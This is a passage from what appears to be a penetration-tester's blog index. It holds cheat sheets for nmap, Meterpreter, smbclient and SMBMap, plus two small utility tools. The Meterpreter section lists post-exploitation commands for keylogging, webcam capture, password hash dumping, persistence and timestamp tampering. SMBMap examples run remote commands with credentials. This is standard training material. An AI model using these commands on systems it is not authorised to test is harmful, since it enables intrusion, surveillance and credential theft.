id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003ch3 id=\"scan-types\"\u003eScan Types\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sT\u003c/code\u003e\u003c/strong\u003e: Perform a TCP connect scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sU\u003c/code\u003e\u003c/strong\u003e: Perform a UDP scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sS\u003c/code\u003e\u003c/strong\u003e: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-Pn\u003c/code\u003e\u003c/strong\u003e: Skip pinging the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sn\u003c/code\u003e\u003c/strong\u003e: Host discovery without scanning ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-A\u003c/code\u003e\u003c/strong\u003e: Enable aggressive scan options.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"advanced-features\"\u003eAdvanced Features\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Scan specific ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p-\u003c/code\u003e\u003c/strong\u003e: Scan all 65,535 ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sV\u003c/code\u003e\u003c/strong\u003e: Detect services and versions running on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-O\u003c/code\u003e\u003c/strong\u003e: Detect the operating system.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****, \u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003ccode\u003e-vv\u003c/code\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e, ****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003ccode\u003e-vvv\u003c/code\u003e\u003c/strong\u003e: Set verbosity levels.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vuln\u003c/code\u003e\u003c/strong\u003e: Run vulnerability scripts.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vulners\u003c/code\u003e\u003c/strong\u003e: Use vulners scripts for CVE-based scanning.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script=http-enum\u003c/code\u003e\u003c/strong\u003e: Act like Nikto to enumerate HTTP resources.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"output-formats\"\u003eOutput Formats\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oN\u003c/code\u003e\u003c/strong\u003e: Normal text output, best for human-readable logs during manual reviews.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oX\u003c/code\u003e\u003c/strong\u003e: XML output, ideal for automated tools or integrations that require structured data.\u003c/li\u003e\n\u003cli\u003e``: Greppable output, useful for scripting and quickly filtering resulst with tools like \u003ccode\u003egrep\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oA\u003c/code\u003e\u003c/strong\u003e: Generate all three formats at once, providing maximum flexibility for further analysis or reporting.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"smb-scripts\"\u003eSMB Scripts\u003c/h2\u003e\n\u003ch3 id=\"enumerate-security-mode\"\u003eEnumerate Security Mode\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-security-mode 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-sessions\"\u003eEnumerate Sessions\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares\"\u003eEnumerate Shares\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares-with-listing\"\u003eEnumerate Shares with Listing\u003c/h3\u003e\n\u003cp\u003eListing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\u003c/p\u003e","title":"nmap"},{"content":"Daily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where RedFlagger comes in. This lightweight Bash script automates the process of downloading and aggregating reports from Red Flag Domains. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\nThe Backstory This project started as a bit of a joke. My friend lil-doudou had written an excellent Python tool called NewRedflag to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\nWhat Does RedFlagger Do? RedFlagger streamlines the process of collecting domain reports. Instead of manually navigating the Red Flag Domains website and downloading reports one by one, you can use RedFlagger to:\nFetch the latest report. Download reports from a specific range of dates. Aggregate all available reports into one file for easier analysis. It’s a no-frills script that prioritizes functionality and flexibility.\nHow Does It Work? RedFlagger fetches reports directly from the Red Flag Domains website by parsing the daily directory. It uses simple Bash commands like curl to download files and aggregates them into a single output file for easy handling. If you’re running a quick analysis or building a dataset for long-term research, this script has you covered.\nKey Features: Custom Date Ranges: Specify a range of days to download only the reports you need. All-Inclusive Downloads: Grab every report available with a single command. Custom Output Files: Aggregate data into a file of your choice instead of dealing with multiple separate files. Why Use RedFlagger? RedFlagger is built for simplicity and speed. It doesn’t aim to replace more advanced tools but instead provides a lightweight option for users who need quick, automated access to domain reports. If you find yourself regularly pulling data from Red Flag Domains, RedFlagger can:\nSave time by automating the download process. Ensure reports are organized and aggregated for easier analysis. Provide flexible options for handling specific dates or all available data. Whether you’re an analyst tracking malicious domains or a researcher building a threat intelligence dataset, RedFlagger can fit seamlessly into your workflow.\nGetting Started Installation RedFlagger is a standalone Bash script, so there’s no complicated setup. Here’s how to get started:\nDownload the script:\ngit clone https://github.com/noobosaurus-r3x/redflagger cd redflagger chmod +x redflagger.sh Make sure curl is installed on your system:\nsudo apt install curl Usage The script provides several options to customize your downloads. Here’s the basic syntax:\n./redflagger.sh [--latest|--days num] [--all] [--output filename] Options --latest or -l: Downloads the report from 1 day ago. --days num or -d num: Downloads the report from num days ago. --all or -a: Downloads all available reports. --output filename or -o filename: Specifies the output file to store the downloaded reports. Defaults to output.txt if no filename is provided. Examples Here are a few practical ways to use RedFlagger:\nDownload the latest report:\n./redflagger.sh -l Download all reports available since 3 days ago:\n./redflagger.sh -d 3 -a -o my_file.txt Download a specific day’s report:\n./redflagger.sh -d 5 -o report_5days_ago.txt Download all reports into a custom file:\n./redflagger.sh -a -o all_reports.txt Limitations and Room for Improvement RedFlagger is intentionally simple, but it’s not without its limitations. Here are a few areas where it could be expanded or improved:\nError Handling: While the script includes basic error checks, it could provide more detailed feedback when something goes wrong (e.g., network issues or missing reports). Parallel Downloads: Adding support for downloading multiple reports simultaneously could speed up large fetches. Advanced Filtering: Options for filtering by domain type or metadata could make the tool even more powerful. If you’re interested in extending RedFlagger, feel free to fork it and make it your own.\nFinal Thoughts RedFlagger is a small, straightforward tool designed to make life easier for anyone working with Red Flag Domains. It doesn’t try to do everything but focuses on doing one thing well: fetching and aggregating domain reports quickly and efficiently.\nWhether you’re doing threat research, building datasets, or just exploring the domain data available, RedFlagger is a lightweight addition to your toolbox. And let’s not forget—it’s also a fun jab at my friend’s Python-first approach. If you’ve got ideas for improvements or run into any issues, don’t hesitate to reach out or fork the project. Happy aggregating!\n","permalink":"http://localhost:1313/tools/redflagger/","summary":"\u003cp\u003eDaily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where \u003cstrong\u003eRedFlagger\u003c/strong\u003e comes in. This lightweight Bash script automates the process of downloading and aggregating reports from \u003ca href=\"https://dl.red.flag.domains/daily/\"\u003eRed Flag Domains\u003c/a\u003e. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\u003c/p\u003e\n\u003ch2 id=\"the-backstory\"\u003eThe Backstory\u003c/h2\u003e\n\u003cp\u003eThis project started as a bit of a joke. My friend \u003cstrong\u003elil-doudou\u003c/strong\u003e had written an excellent Python tool called \u003ca href=\"https://github.com/lil-doudou/NewRedflag\"\u003eNewRedflag\u003c/a\u003e to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\u003c/p\u003e","title":"redflagger"},{"content":"When you need to quickly understand the structure of a webpage, a lightweight tool can save the day. Webpage Infos Extractor is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\nWhy Build This? Sometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\nWhat Does It Do? Once activated, the bookmarklet scans the current webpage and extracts:\nForms: Shows details like form actions, methods, and input elements.\nLinks: Lists all hyperlinks found on the page.\nImages: Displays all images in an easy-to-view layout.\nWord Count: Calculates the total number of words in the page’s text content.\nThe results are neatly presented in a new browser window with clean formatting, so you can analyze everything at a glance.\nInstallation Setting it up is simple. Here’s how:\nOpen your web browser and create a new bookmark.\nEdit the bookmark’s URL field and paste the following JavaScript code:\njavascript:(function(){var forms=document.getElementsByTagName(\u0026#39;form\u0026#39;);var links=document.getElementsByTagName(\u0026#39;a\u0026#39;);var images=document.getElementsByTagName(\u0026#39;img\u0026#39;);var bodyText=document.body.innerText;var wordCount=bodyText.split(/\\s+/).filter(function(word){return word.length\u0026gt;0;}).length;var newWindow=window.open(\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;width=800,height=600\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Extracted Data\u0026lt;/title\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;style\u0026gt;body{font-family:Arial,sans-serif}table{width:100%;border-collapse:collapse;margin-bottom:20px}th,td{border:1px solid #ddd;padding:8px;text-align:left}th{background-color:#f2f2f2}tr:nth-child(even){background-color:#f9f9f9}h2{background-color:#4CAF50;color:white;padding:10px}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Forms:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;forms.length;i++){var form=forms[i];newWindow.document.write(\u0026#39;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th colspan=\u0026#34;3\u0026#34;\u0026gt;Form \u0026#39;+(i+1)+\u0026#39;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.action||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Method\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.method||\u0026#39;get\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Type\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Value\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var j=0;j\u0026lt;form.elements.length;j++){var element=form.elements[j];var value=element.value||\u0026#39;N/A\u0026#39;;if(element.type===\u0026#39;checkbox\u0026#39;||element.type===\u0026#39;radio\u0026#39;){value=element.checked?\u0026#39;on\u0026#39;:\u0026#39;off\u0026#39;}newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.name||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.type||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+value+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Links:\u0026lt;/h2\u0026gt;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Link\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;links.length;i++){newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;+links[i].href+\u0026#39;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39;+links[i].href+\u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Images:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;images.length;i++){newWindow.document.write(\u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;+images[i].src+\u0026#39;\u0026#34; style=\u0026#34;max-width:100%;display:block;margin-bottom:10px;\u0026#34;\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Word Count:\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;\u0026#39;+wordCount+\u0026#39; words\u0026lt;/p\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;);newWindow.document.close();})(); Save the bookmark.\nThat’s it! You now have a bookmarklet ready to extract webpage info.\nHow to Use Navigate to the webpage you want to analyze.\nClick on the saved bookmarklet.\nA new window will pop up with the following details:\nForms: Lists actions, methods, and input fields.\nLinks: Displays all hyperlinks found on the page.\nImages: Previews all images on the page.\nWord Count: Shows the total word count of the page’s text content.\nWhy Use It? This tool is perfect for:\nWeb Developers: Debugging forms, analyzing links, or reviewing images for optimization.\nContent Creators: Counting words or inspecting embedded media.\nResearchers: Extracting links or analyzing page structures quickly.\nIt’s not trying to replace full-fledged tools like browser dev tools, but it’s great for quick insights without digging into a complex interface.\nLimitations This bookmarklet is lightweight and portable, but it’s not flawless. Here are a few things to keep in mind:\nBrowser Compatibility: It works on most modern browsers but may struggle with certain page structures or dynamic content.\nStatic Analysis: It doesn’t execute JavaScript-heavy elements, so it’s best suited for simpler pages.\nBasic Formatting: The output is clean but not customizable.\nFinal Thoughts The Webpage Infos Extractor isn’t revolutionary, but it’s incredibly handy. Whether you’re troubleshooting a webpage or casually analyzing content, this bookmarklet gives you the essentials at a click. Simple, portable, and effective—sometimes, that’s all you need. If you think of ways to enhance it, feel free to tweak the code and make it your own!\n","permalink":"http://localhost:1313/tools/webpage_infos_extractor/","summary":"\u003cp\u003eWhen you need to quickly understand the structure of a webpage, a lightweight tool can save the day. \u003cstrong\u003eWebpage Infos Extractor\u003c/strong\u003e is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\u003c/p\u003e\n\u003ch2 id=\"why-build-this\"\u003eWhy Build This?\u003c/h2\u003e\n\u003cp\u003eSometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\u003c/p\u003e","title":"Webpage Infos Extractor"},{"content":"Meterpreter, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\nBasic Commands Start with the essentials to get a lay of the land:\nhelp: Display a list of available commands (your lifeline when you\u0026rsquo;re lost). sysinfo: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;). ps: List running processes. kill \u0026lt;PID\u0026gt;: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;). migrate \u0026lt;PID\u0026gt;: Move Meterpreter to a different process to stay under the radar. rev2self: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird). File System Commands For poking around the file system:\nls: List files in the current directory. cd \u0026lt;path\u0026gt;: Change to a new directory. pwd: Print the current working directory. cat \u0026lt;filename\u0026gt;: Display the contents of a file. download \u0026lt;filename\u0026gt;: Pull a file from the target to your local machine. upload \u0026lt;filename\u0026gt;: Push a file to the target system. Network Commands To scope out the network situation:\nipconfig: Display network configuration (IP addresses, gateways, etc.). route: Show the routing table. netstat: View active network connections. portfwd [add/remove]: Set up port forwarding (e.g., local port -\u0026gt; remote service). getsockname: Identify the socket name for a connection. User Management Commands Understand who you are and who else is around:\ngetuid: Display the current user ID. ps: See running processes and their owners. getprivs: List the privileges available to the current user. getsystem: Attempt to escalate privileges to SYSTEM (good luck!). Persistence Commands Stick around longer than you’re welcome:\npersistence: Enable Meterpreter persistence on the target (requires autorun setup). run \u0026lt;script\u0026gt;: Execute scripts or commands at startup. Shell Commands Take a deeper dive with shell access:\nshell: Open a command prompt on the target (sometimes, old-school is best). execute -f \u0026lt;command\u0026gt;: Run a command on the target. background: Push your current session into the background to multitask. Ctrl+Z: Suspend the current session (don’t forget to resume it later). Other Commands For the extra \u0026ldquo;James Bond\u0026rdquo; touch:\nuse \u0026lt;extension\u0026gt;: Load a Meterpreter extension (e.g., incognito, sniffer). keyscan_start: Begin logging keystrokes (capture your target’s every typo). keyscan_dump: Dump the logged keystrokes. screenshot: Capture a screenshot of the target’s desktop. webcam_list: See available webcams on the target. webcam_snap: Take a snapshot from a webcam. hashdump: Dump password hashes (everyone’s favorite). timestomp \u0026lt;file\u0026gt;: Modify the timestamps of a file (because subtlety matters). Tips and Tricks Migrate Smartly: When migrating, pick a process that’s stable (e.g., explorer.exe) and won’t raise suspicions. Background Often: Always background your session before launching new exploits—multitasking is key. Scripting is King: Use Meterpreter scripts (run \u0026lt;script\u0026gt;) to automate repetitive tasks. Final Thoughts Meterpreter is your trusty post-exploitation buddy. Use it wisely, creatively, and responsibly. Keep this cheat sheet handy for quick reference—whether you\u0026rsquo;re downloading files, snapping screenshots, or simply making your mark in the digital shadows. Happy hacking!\n","permalink":"http://localhost:1313/cheat-sheets/meterpreter/","summary":"\u003cp\u003e\u003cstrong\u003eMeterpreter\u003c/strong\u003e, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\u003c/p\u003e\n\u003ch2 id=\"basic-commands\"\u003eBasic Commands\u003c/h2\u003e\n\u003cp\u003eStart with the essentials to get a lay of the land:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehelp\u003c/code\u003e\u003c/strong\u003e: Display a list of available commands (your lifeline when you\u0026rsquo;re lost).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esysinfo\u003c/code\u003e\u003c/strong\u003e: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eps\u003c/code\u003e\u003c/strong\u003e: List running processes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ekill \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003emigrate \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Move Meterpreter to a different process to stay under the radar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003erev2self\u003c/code\u003e\u003c/strong\u003e: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"file-system-commands\"\u003eFile System Commands\u003c/h2\u003e\n\u003cp\u003eFor poking around the file system:\u003c/p\u003e","title":"Meterpreter"},{"content":"smbclient is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\nBasic Usage To connect to an SMB file share, use the following syntax:\nsmbclient //server/share [options] Replace server with the hostname or IP address of the server hosting the file share. Replace share with the name of the file share. Once connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\nCommon Options -U \u0026lt;username\u0026gt;: Specify the username to use for authentication. -W \u0026lt;workgroup\u0026gt;: Specify the domain or workgroup. -I \u0026lt;IP address\u0026gt;: Directly specify the server\u0026rsquo;s IP address. -p \u0026lt;port\u0026gt;: Specify the port (default is 445). -d \u0026lt;debug level\u0026gt;: Set the debug level for verbose output. -N: Suppress the password prompt (useful for guest accounts). Available Commands Once connected, the following commands allow you to interact with the file share:\nls: List files and directories in the current directory. cd \u0026lt;directory\u0026gt;: Change to a different directory. pwd: Print the current working directory. put \u0026lt;file\u0026gt;: Upload a file to the share. get \u0026lt;file\u0026gt;: Download a file from the share. mput \u0026lt;files\u0026gt;: Upload multiple files. mget \u0026lt;files\u0026gt;: Download multiple files. rm \u0026lt;file\u0026gt;: Delete a file. mkdir \u0026lt;directory\u0026gt;: Create a new directory. rmdir \u0026lt;directory\u0026gt;: Remove a directory. exit: Disconnect from the share and exit smbclient. Examples List Files in a Share smbclient //server/share -c ls Connect with a Specific Username and Password smbclient //server/share -U username%password Connect Using an IP Address and Port smbclient //server/share -I 192.168.1.100 -p 139 Upload a File smbclient //server/share -c \u0026#34;put /path/to/local/file\u0026#34; Download a File smbclient //server/share -c \u0026#34;get /path/to/remote/file\u0026#34; Create a New Directory smbclient //server/share -c \u0026#34;mkdir newdirectory\u0026#34; When to Use smbclient Quick Access: Need to interact with a file share without mounting it? smbclient gives you immediate access. Testing Permissions: Check which directories and files are accessible under different credentials. File Operations: Download, upload, or manage files on SMB shares. Debugging: Troubleshoot network shares with verbose output using -d. Final Thoughts smbclient is a powerful yet straightforward tool for interacting with SMB shares. Whether you’re performing quick tests or conducting audits, it streamlines tasks that would otherwise require mounting shares. Keep this cheat sheet handy for quick reference and efficient file share management!\n","permalink":"http://localhost:1313/cheat-sheets/smbclient/","summary":"\u003cp\u003e\u003cstrong\u003esmbclient\u003c/strong\u003e is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\u003c/p\u003e\n\u003ch2 id=\"basic-usage\"\u003eBasic Usage\u003c/h2\u003e\n\u003cp\u003eTo connect to an SMB file share, use the following syntax:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbclient //server/share \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eserver\u003c/code\u003e\u003c/strong\u003e with the hostname or IP address of the server hosting the file share.\u003c/li\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eshare\u003c/code\u003e\u003c/strong\u003e with the name of the file share.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOnce connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\u003c/p\u003e","title":"smbclient"},{"content":"SMBMap is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\nBasic Syntax smbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; [options] Common Usage Examples Connect with Null Password smbmap -u guest -p \u0026#34;\u0026#34; -d . -H 192.168.1.1 Connect as Admin with Password smbmap -u admin -p password123 -d . -H 192.168.1.1 Execute a Command smbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u0026#39;ipconfig\u0026#39; Connect to a Specific Drive smbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u0026#39;C$\u0026#39; Upload a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u0026#39;/path/to/file.txt\u0026#39; \u0026#39;C$\\file.txt\u0026#39; Download a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u0026#39;C$\\file.txt\u0026#39; Enumerate a Specific Share smbmap -H 192.168.1.1 -s \u0026#39;share_name\u0026#39; Enumerate Users smbmap -H 192.168.1.1 --users Key Options -u \u0026lt;username\u0026gt;: Specify the username. -p \u0026lt;password\u0026gt;: Specify the password. -H \u0026lt;host\u0026gt;: Specify the target host. -r \u0026lt;share\u0026gt;: Connect to a specific share or drive. -x \u0026lt;command\u0026gt;: Execute a command on the target. --upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;: Upload a file to the target. --download \u0026lt;remote_file\u0026gt;: Download a file from the target. -s \u0026lt;share\u0026gt;: Enumerate a specific share. --users: Enumerate users on the target. -R: Check for shares with full permissions. -p \u0026lt;port\u0026gt;: Specify a port. When to Use SMBMap Permission Audits: Quickly identify shares with read, write, or full access permissions. Command Execution: Execute remote commands on accessible shares. File Transfers: Upload or download files directly from SMB shares. User Enumeration: Discover user accounts configured on the target system. Final Thoughts SMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes 